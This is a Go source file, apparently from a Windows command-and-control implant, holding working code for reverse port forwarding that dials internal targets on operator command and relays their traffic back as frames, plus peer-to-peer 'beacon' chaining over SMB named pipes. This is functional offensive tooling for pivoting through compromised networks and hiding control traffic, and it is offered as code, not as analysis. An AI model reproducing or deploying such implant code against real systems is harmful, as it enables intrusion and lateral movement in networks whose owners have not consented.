//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"
)

var (
	rportfwdConns  = make(map[uint64]*rportfwdConn)
	rportfwdMu     sync.Mutex
	rportfwdNextID uint64
)

type rportfwdConn struct {
	connID   uint64
	target   string
	tcpConn  net.Conn
	mu       sync.Mutex
	closed   bool
	outbound []socksFrame
}

func rportfwdCollectOutbound() []socksFrame {
	rportfwdMu.Lock()
	defer rportfwdMu.Unlock()
	var frames []socksFrame
	for _, rc := range rportfwdConns {
		rc.mu.Lock()
		if len(rc.outbound) > 0 {
			frames = append(frames, rc.outbound...)
			rc.outbound = nil
		}
		rc.mu.Unlock()
	}
	return frames
}

func rportfwdHandleFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		}
	}
}

func rportfwdDial(connID uint64, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		rportfwdMu.Lock()
		rc := &rportfwdConn{connID: connID, target: target, closed: true}
		rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_error", Data: []byte(err.Error())})
		rportfwdConns[connID] = rc
		rportfwdMu.Unlock()
		return
	}

	rc := &rportfwdConn{
		connID:  connID,
		target:  target,
		tcpConn: conn,
	}
	rportfwdMu.Lock()
	rportfwdConns[connID] = rc
	rportfwdMu.Unlock()

	rc.mu.Lock()
	rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_connected"})
	rc.mu.Unlock()

	go func() {
		buf := make([]byte, 10240)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				rportfwdClose(connID)
				return
			}
			rc.mu.Lock()
			rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_data", Data: append([]byte{}, buf[:n]...)})
			rc.mu.Unlock()
		}
	}()
}

func rportfwdWrite(connID uint64, data []byte) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	rportfwdMu.Unlock()
	if !ok || rc.closed {
		return
	}
	rc.mu.Lock()
	defer rc.mu.Unlock()
	if rc.tcpConn != nil {
		rc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		rc.tcpConn.Write(data)
	}
}

func rportfwdClose(connID uint64) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	if ok {
		rc.closed = true
		if rc.tcpConn != nil {
			rc.tcpConn.Close()
		}
		rc.outbound = nil
		delete(rportfwdConns, connID)
	}
	rportfwdMu.Unlock()
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf(`\\.\pipe\%s`, pipeName)
	conn, err := winio.DialPipe(pipePath, nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	ln, err := winio.ListenPipe(fmt.Sprintf(`\\.\pipe\%s`, P2PListenAddr), nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}
